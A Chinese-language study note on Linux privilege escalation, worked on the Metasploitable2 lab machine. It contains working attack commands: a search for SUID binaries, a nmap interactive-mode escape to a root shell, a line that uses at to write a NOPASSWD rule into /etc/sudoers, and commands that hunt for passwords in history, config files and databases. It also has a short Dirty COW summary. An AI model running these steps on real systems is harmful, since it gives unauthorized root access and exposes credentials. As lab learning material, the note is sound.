# 提权
MSF 拿到普通用户 shell 只是开始，打穿还需要提权。  
## SUID 文件
一个 root 拥有的程序带了 SUID 位，运行的时候是以 root 身份跑的。  
用这个 find 的 `-4000` 找 SUID 位。  
```
find / -perm -4000 2>/dev/null
```

输出：  
```
find / -perm -4000 -type f 2>/dev/null
/bin/umount
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/ping6
/sbin/mount.nfs
/lib/dhcp3-client/call-dhclient-script
/usr/bin/sudoedit
/usr/bin/X
/usr/bin/netkit-rsh
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/netkit-rlogin
/usr/bin/arping
/usr/bin/at
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/nmap
/usr/bin/chsh
/usr/bin/netkit-rcp
/usr/bin/passwd
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/lib/telnetlogin
/usr/lib/apache2/suexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
```

像 `/usr/bin/passwd`、`/usr/bin/sudo`、`/usr/bin/mount` 有 SUID 位正常，但比如 `nmap`、`at` 这类工具有 SUID 位就可以找漏洞提权。  

比如 Metasploitable2 用 tomcat 拿到 shell 后，扫完 SUID 发现 nmap 带 SUID 位可以提权：  
``` bash
nmap --interactive # 进入交互模式
!sh  # 弹出 shell,因为有 suid,所以是 root
```

```
sh-3.2# id
id
uid=110(tomcat55) gid=65534(nogroup) euid=0(root) groups=65534(nogroup)
```
这样拿到的 shell，用 whoami 和 id 看是 root，确定拿到 root 权限了。  

这是因为 nmap 4.53 在交互模式会 spawn 出 shell 但没有正确丢弃 euid，它是 suid root，所以就可以拿到 root shell 了。  

还可以用 at 写 sudoers。  

```bash
echo 'echo "ctf ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' | at now
```

## sudo
可以用 `sudo -l` 列出当前用户允许执行的命令，比如 Metasploitable2 的 msfadmin 用户就是：  
```
(ALL) ALL
```

如果遇到 `NOPASSWD:` 就不用密码也能跑。  
不知道密码就信息收集里找密码，比如：  
```bash
# 历史命令（最爱藏密码）
cat ~/.bash_history

# 配置文件里的数据库/服务密码
grep -r "password\|passwd" /etc/ 2>/dev/null
find / -name "*.conf" -o -name "*.php" 2>/dev/null | xargs grep -l "pass" 2>/dev/null

# web 目录里的敏感文件
ls /var/www/  # Metasploitable2 的 DVWA 默认有弱口令 admin/password

# 数据库（如果 MySQL 能进）
mysql -u root    # 很多靶机 root 无密码，进了就能读库翻凭据
```

这些是信息收集的 trick。  

## 内核漏洞
### Dirty cow
写入时拷贝(Copy-On-Write)竞态。  
内核在复制页面和检查只读权限之间存在一个时间差，攻击者利用这个竟态绕过只读保护，往只读文件里写数据。  

Linux Kernel(2.6.22~4.8)  

## 实战提权思路
先侦查，摸清靶机：  
``` bash
id # 你是啥权限、在哪个组（docker？sudo？）
uname -a # 内核版本（决定能否打内核洞）
sudo -l # sudo 配置
find / -perm -4000 2>/dev/null # SUID
cat /etc/passwd | grep -v nologin # 有哪些用户
ps aux | grep root # root 在跑什么（可写的服务脚本=机会）
```

然后自动化提权……  
还得恢复现场。  
